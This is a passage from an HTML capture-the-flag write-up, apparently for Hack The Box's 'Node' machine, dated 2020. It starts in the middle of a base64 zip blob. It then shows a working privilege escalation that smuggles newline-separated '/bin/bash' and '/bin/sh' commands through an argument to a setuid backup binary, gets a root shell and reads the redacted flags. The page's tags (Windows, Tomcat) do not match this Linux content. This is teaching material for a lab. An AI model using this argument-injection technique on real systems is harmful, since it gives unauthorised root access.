+ n4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4z
+ mpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDB
+ D6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0
+ HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROF
+ stmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2Qvb
+ dD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22W
+ lFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTV
+ XBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEa
+ OWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ij
+ m5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZ
+ tEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB
+ 4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/t
+ gtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAA
+ AAABAAEAQQAAAB4EAAAAAA==</figure></pre>
+ 
+ <p>Run as a root user.
+ 
+ <pre><figure class="highlight plain"> $ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "puto
+ > /bin/bash
+ > puto"
+         zip warning: name not matched: puto
+ 
+ zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_1051361863 . -i puto)
+ root@node:/# id
+ uid=0(root) gid=1001(mark) groups=1001(mark)
+ $ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'puto\n/bin/sh\nputo')"
+         zip warning: name not matched: puto
+ 
+ zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_180661545 . -i puto)
+ # id
+ uid=0(root) gid=1001(mark) groups=1001(mark)
+ #</figure></pre>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain"> root@node:/tmp# cd ..
+root@node:/# cd /root
+root@node:/root# ls
+root.txt
+root@node:/root# cat root.txt
+***Here you could find the root flag***
+root@node:/root# cd /home
+root@node:/home# ls
+frank  mark  tom
+root@node:/home# cd mark
+root@node:~# ls
+root@node:~# cd ..
+root@node:/home# cd frank/
+root@node:/home/frank# ls
+root@node:/home/frank# cd ..
+root@node:/home# cd tom/
+root@node:/home/tom# ls
+user.txt
+root@node:/home/tom# cat user.txt
+***Here you could find the user flag***
+root@node:/home/tom# </figure></pre>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-12</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#DefaultCredentials</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Tomcat</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
